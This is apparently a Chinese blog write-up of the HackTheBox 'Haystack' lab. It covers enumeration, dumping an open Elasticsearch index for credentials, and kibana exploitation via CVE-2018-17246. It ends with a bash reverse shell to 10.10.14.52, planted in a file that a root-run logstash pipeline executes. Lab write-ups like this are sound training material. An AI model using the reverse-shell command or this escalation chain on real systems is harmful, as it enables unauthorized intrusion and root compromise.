---
title: hackthebox-Haystack
mathjax: false
date: 2019-11-03 19:40:25
categories:
 - 渗透测试
 - hackthebox
tags:
 - hackthebox
---

![](/img/haystack/1.png)

<!-- more -->

* 使用`nmap`扫描到端口22、80、9200（ElasticSearch 6.4.2）

```
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    nginx 1.12.2
| http-methods: 
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
```

* 访问 http://10.10.10.115 得到图片needle.jpg，`Stegsolve`查看图片可见base64的提示，解码得西班牙语得提示

![needle](/img/haystack/needle.jpg)

```
la aguja en el pajar es "clave"
the needle in the haystack is "key"
```

* 使用[`elasticsearch-dump`](https://github.com/taskrabbit/elasticsearch-dump)获取9200的quotes数据，在数据中搜索可得到两个`base64`加密的数据（搜索`base64`得特征字符，比如`=`），分别为用户名和密码，解码为security和spanish.is.key

```sh
elasticdump --input=http://10.10.10.115:9200/quotes --output=quotes.json --type=data
```

* 使用`ssh`登录获得user.txt

![](/img/haystack/2.png)

* 使用`scp`上传[`LinEnum`](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)获取目标机器信息，首先发现`logstash`以root权限运行，查看/etc/logstash/conf.d/的配置文件，发现其需要root或kibana权限才可以查看

![](/img/haystack/3.png)

* 利用[CVE-2018-17246](https://github.com/mpgn/CVE-2018-17246)获取kibana的shell

![](/img/haystack/4.png)

* 查看/etc/logstash/conf.d/的配置文件，发现`logstash`每10s读取/opt/kibana/logstash_*的内容并在过滤后执行，则`echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.14.52/22222 0>&1" > /opt/kibana/logstash_ert`（可自行搭建`kibana`，使用其[grok调试器](https://www.jianshu.com/p/443f1ea7b640)测试过滤效果），等待一段时间获取返回的shell

```json
cat /etc/logstash/conf.d/filter.conf
filter {
	if [type] == "execute" {
		grok {
			match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
		}
	}
}

cat /etc/logstash/conf.d/input.conf
input {
	file {
		path => "/opt/kibana/logstash_*"
		start_position => "beginning"
		sincedb_path => "/dev/null"
		stat_interval => "10 second"
		type => "execute"
		mode => "read"
	}
}

cat /etc/logstash/conf.d/output.conf
output {
	if [type] == "execute" {
		stdout { codec => json }
		exec {
			command => "%{comando} &"
		}
	}
}
```

* 获得root.txt

![](/img/haystack/5.png)